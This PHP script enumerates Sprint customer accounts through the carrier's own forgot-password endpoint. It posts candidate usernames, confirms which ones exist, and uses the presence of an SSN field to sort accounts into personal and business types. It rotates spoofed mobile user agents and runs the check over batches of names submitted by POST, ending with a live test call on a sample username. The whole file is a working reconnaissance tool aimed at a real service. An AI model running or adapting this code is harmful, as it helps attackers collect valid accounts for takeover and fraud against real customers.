<?php 
 
 require_once(__DIR__.'/includes/UserAgent.php');
 require_once(__DIR__.'/includes/Requests.php');

 Requests::register_autoloader();
 $UAGEN = new UserAgent;


function gen_uuid() {
    return sprintf( '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        // 32 bits for "time_low"
        mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ),

        // 16 bits for "time_mid"
        mt_rand( 0, 0xffff ),

        // 16 bits for "time_hi_and_version",
        // four most significant bits holds version number 4
        mt_rand( 0, 0x0fff ) | 0x4000,

        // 16 bits, 8 bits for "clk_seq_hi_res",
        // 8 bits for "clk_seq_low",
        // two most significant bits holds zero and one for variant DCE1.1
        mt_rand( 0, 0x3fff ) | 0x8000,

        // 48 bits for "node"
        mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff )
    );
}

 function GeraHash($qtd=50){ 
	//Under the string $Caracteres you write all the characters you want to be used to randomly generate the code. 
	$Caracteres = 'ABCDEFGHIJKLMOPQRSTUVXWYZ0123456789'; 
	$QuantidadeCaracteres = strlen($Caracteres); 
	$QuantidadeCaracteres--; 

	$Hash=NULL; 
	    for($x=1;$x<=$qtd;$x++){ 
	        $Posicao = rand(0,$QuantidadeCaracteres); 
	        $Hash .= substr($Caracteres,$Posicao,1); 
	    } 

	return $Hash; 
} 

function verifyuser($name){

	
	global $UAGEN;

	
	$user_agent = $UAGEN::random([
	    'os_type' => ['Android'],
	    'device_type' => ['Mobile', 'Tablet']
	]);



	$user_ = [];
    
    $user_agent = 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.'.rand(1111,9999).'.114 Mobile Safari/537.36';


     // Creating Session
	$session = new Requests_Session('https://mysprint.sprint.com'); 
    $session->useragent = $user_agent;



	// first Requets
	$url = 'https://mysprint.sprint.com/mysprint/BaseAjaxServlet?pageContext=forgotPassword';
	$params = "ajax=true&txtForgotPasswordUsername=". urlencode($name) ."&hidForgotPasswordState=initialCheck";
	parse_str($params,$params_output);


    $user_exists = $session->post($url, array(), $params_output);


    if( !(strpos($user_exists->body, '"validated":true') > -1) ) return false;

	$user_['name'] = $name;

	$url = 'https://mysprint.sprint.com/mysprint/pages/sl/forgotpassword/modals/forgot_password_single_ban.jsp';
    $user_type = $session->get($url, array(), []);

	$user_['type'] = strpos($user_type->body, 'id="lblSSN"') ? "normal":"bussines";
	$user_['id'] = md5($name);
	$user_['date'] = time();
	$user_['password'] = false;

	return $user_;

};


function action_Verify($users=null){

	if(!$users) return ["error"=>"No Users Set"];
	if(!count($users)) return ["error"=>"No Users Set"];
	$returner = [];

	foreach ($users as $key => $user) {
		$response = verifyuser($user);
		if($response){
			array_push($returner, $response);
		};
	};

	return $returner;

};


function action_prueba(){
	return ["success"=>"probando"];
}




  if (isset($_POST['action'])) {
  	 foreach ($_POST['action'] as $function => $data) {
  	 	$action = 'action_'.$function;
  	 	if(function_exists($action)){
  	 		$response = $action($data);
  	 		exit (json_encode($response));
  	 	};
  	 };
  };

var_dump(verifyuser('abcplumbing'));

 ?>